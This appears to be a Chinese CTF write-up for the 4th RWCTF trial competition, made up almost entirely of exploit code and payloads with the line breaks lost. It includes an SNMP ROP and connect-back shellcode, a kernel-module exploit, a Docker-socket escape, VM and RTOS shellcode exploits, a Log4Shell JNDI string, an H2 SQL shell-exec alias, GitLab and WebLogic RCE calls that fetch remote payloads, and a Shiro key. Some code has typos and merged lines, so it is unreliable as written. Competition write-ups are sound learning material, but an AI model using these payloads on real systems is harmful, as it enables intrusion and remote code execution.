# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/CTF大赛WP集合/articles/赛题全解-第四届_RWCTF_体验赛_WriteUp.md
# TITLE: 赛题全解|第四届 RWCTF 体验赛 WriteUp
# CATEGORY: pwn

#!/usr/bin/env python
# -*- coding: utf-8 -*-#coding=utf-8from http.client import PAYMENT_REQUIRED
from os import O_ASYNC
from easysnmp import snmp_get,snmp_setimport struct
from pwn import cyclic
from pwn import p64
from pwn import asm
from pwn import shellcraft
from pwn import context
context.arch = "aarch64"
HOST = ""PORT = 161LHOST = ""OID = "1.3.6.1.4.1.23333.1.0"
payload = b""payload += p64(0x4DE400)*(136//8)payload += p64(0xdeadbeef)payload += p64(0x493F88)payload += p64(0x589088)*8
payload += p64(0)payload += p64(0x493F68)payload += p64(0)payload += p64(0x589000)payload += p64(0x1000)payload += p64(0x7)payload += p64(1)payload += p64(0x589088)
payload += p64(0)payload += p64(0x5891c8)payload += p64(0)payload += p64(0)payload += p64(0)payload += p64(0)payload += p64(0)payload += p64(0)

payload += asm(shellcraft.connect(LHOST,4444,'ipv4'))payload += asm(shellcraft.cat("/flag", fd=7))
snmp_set(OID,payload.decode("latin"),type="OCTETSTR",hostname=HOST,remote_port=PORT,community="public",version=2)
int __cdecl xkmod_init(){ kmem_cache *v0; // rax
 printk(&unk_1E4); misc_register(&xkmod_device); v0 = (kmem_cache *)kmem_cache_create("lalala", 192LL, 0LL, 0LL, 0LL); buf = 0LL; s = v0; return 0;}
__int64 __fastcall xkmod_ioctl(__int64 fd, int cmd, void *value){ __int64 v4; // [rsp+0h] [rbp-20h] BYREF unsigned int v5; // [rsp+8h] [rbp-18h] unsigned int v6; // [rsp+Ch] [rbp-14h] unsigned __int64 v7; // [rsp+10h] [rbp-10h]
 v7 = __readgsqword(0x28u); if ( !value ) return 0LL; copy_from_user(&v4, value, 16LL); if ( cmd == 107374182 ) { if ( buf && v6 <= 0x50 && v5 <= 0x70 ) { copy_from_user((char *)buf + (int)v5, v4, (int)v6); return 0LL; } } else { if ( cmd != 125269879 ) { if ( cmd == 17895697 ) buf = (void *)kmem_cache_alloc(s, 3264LL); return 0LL; } if ( buf && v6 <= 0x50 && v5 <= 0x70 ) { copy_to_user(v4, (char *)buf + (int)v5); return 0LL; } } return xkmod_ioctl_cold();}
    #include <stdio.h>#include <sys/types.h>#include <sys/io.h>#include <sys/ioctl.h>#include <fcntl.h>#include #include <stdlib.h>#include <string.h>#include <wait.h>
struct param{ void *as; int start; int len;};
struct param *p;
void alloc(int fd){ ioctl(fd, 0x1111111, p);}
void rd(int fd){ ioctl(fd, 0x7777777, p);}
void wt(int fd){ ioctl(fd, 0x6666666, p);}
int main(int argc, char const *argv[]){ int fd = open("/dev/xkmod", O_RDONLY); if (fd < 0) { puts("[*]open error!"); exit(0); } puts("[*]alloc from cache");
 p = malloc(sizeof(struct param)); p->as = malloc(0x100); alloc(fd); close(fd);
 int pid = fork(); if (pid < 0) { puts("[*]fork error!"); exit(0); } if (pid == 0) { puts("[*]this is child process!"); fd = open("/dev/xkmod", O_RDONLY); memset(p->as, 0, sizeof(p->as)); p->start = 0; p->len = 0x28; wt(fd); system("/bin/sh"); exit(0); } else { puts("[*]this is child process!"); int status; wait(&status); }
 return 0;}
docker run -i -m 128m -v /var/run/docker.sock:/s
sed -i "s/http://archive.ubuntu.com/http://mirrors.aliyun.com/g" /etc/apt/sources.listsed -i "s/http://security.ubuntu.com/http://mirrors.aliyun.com/g" /etc/apt/sources.listapt updateDEBIAN_FRONTEND="noninteractive" apt-get -y install docker.iodocker -H unix:///s run -i --privileged ubuntu bashmkdir /tmp/amount /dev/sda1 /tmp/achmod 777 /tmp/a/root/flagcat /tmp/a/root/flag
enum impl_instr { NOP = 0, /* no-op */
 /* Registers/stack */ PUSH, /* push a constant */ POP, /* pop from stack */ POPS, /* pop from the stack into register no. (argument) */ STORE, /* save to register no. (argument) */ LOAD, /* push from register no. (argument) */
 /* Arithmetic */ /* pop twice, do operation then push */ ADD, SUB, MUL, DIV, REM, /* remainder */
 /* Bitwise operators */ /* pop, do operation, then push */ NOT, AND, /* pop twice */ OR, /* pop twice */ XOR, /* pop twice */ LSHFT, /* pop once, shift popped by arg */ RSHFT, /* pop once, shift popped by arg */
 /* Flow control */ JMP, /* jump to line arg */ IFEQ, /* pop twice, jump to line arg if equal */ IFNEQ, IFZ, /* pop once, jump to line arg if zero */ IFNZ,
 /* I/O */ PRINT, /* print top of stack */ PRINC, POPP, /* print top of stack and pop */ POPPC,
 DONE};
    #define CHECK_REG(x) if (x > REGNO) { fprintf(stderr, "INVALID REGISTER: ABORTn"); exit(1); }
from pwn import *
p = process("./lvm")libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
def nop(): p.sendline(b"0")
def push(value): p.sendline(b"1") p.sendline(str(value).encode("latin"))
def pop(): p.senline(b"2")
def pops(reg): p.sendline(b"3") p.sendline(str(reg).encode("latin"))
def store(reg): p.sendline(b"4") p.sendline(str(reg).encode("latin"))
def load(reg): p.sendline(b"5") p.sendline(str(reg).encode("latin"))
def add(): p.sendline(b"6")
def sub(): p.sendline(b"7")
def mul(): p.sendline(b"8")
def div(): p.sendline(b"9")
def jmp(value): p.sendline(b"17") p.sendline(str(value).encode("latin"))
def done(): p.sendline(b"26")
p.sendline(b"28")
# pause()
load(-40)push(0x1120)sub()store(0) # proc_base
load(-27)push(0x13900)sub()store(1)
load(-35)push(0x662e2)sub()store(2) # libc_base
# 0x000000000000101a: ret;# 0x0000000000002483: pop rdi; ret;
load(0)push(0x101a)add()store(-0x2000000000000000 + 0x9C61)
load(0)push(0x2483)add()store(-0x2000000000000000 + 0x9C62)
load(2)push(libc.search(b"/bin/sh").__next__())add()store(-0x2000000000000000 + 0x9C63)
load(2)push(libc.symbols["system"])add()store(-0x2000000000000000 + 0x9C64)
# load(-0x2000000000000000 + 0x9C61)
# pause()
p.interactive()
import pwn
pwn.context.log_level = "debug"

p = pwn.process("qemu-system-arm -m 64 -nographic -machine vexpress-a9 -monitor null -kernel ./rtos.bin" ,shell=True)
p.recvuntil("change screen img")
flag_addr = 0x60022E60puts_adddr = 0x60020698
shellcode = ''shellcode += "ldr r0, =0x60022E60n"shellcode += "ldr pc, =0x60020698n"
shellcode = pwn.asm(shellcode, arch="arm")
p.sendline(b'a'*0x14 + pwn.p32(0x6045a518) + shellcode)
p.interactive()
POST /doLogin HTTP/1.1Host: 47.102.135.31:
38178Content-Length: 68Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://47.102.135.31:
38178Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://47.102.135.31:
38178/login.htmlAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: JSESSIONID=C0AA8E4BF2CD55850E48239DB2EB00EDConnection: close
username=${j${::-n}di:${::-l}dap://your_server:
1234/a}&password=b
python redis-attack.py -r 192.168.1.234 -L 192.168.1.2 -p 6379
cat /tmp/flag.txt
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\A"); return s.hasNext() ? s.next() : ""; }$$;
CALL SHELLEXEC('whoami')
CALL SHELLEXEC('cat /root/flag.txt')
python3 CVE-2021-2205.py -a true -t http://gitlab.example.com -c "sh 1.sh"
cat /tmp/flag.txt
securityManager.rememberMeManager.cipherKey = ODN6dDZxNzh5ejB6YTRseg==
http://your-ip:
7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://example.com/rce.xml")
<?xml version="1.0" encoding="UTF-8" ?>  <constructor-arg> <list> <value>bash</value> <value>-c</value> <value><![CDATA[touch /tmp/success2]]></value> </list> </constructor-arg>
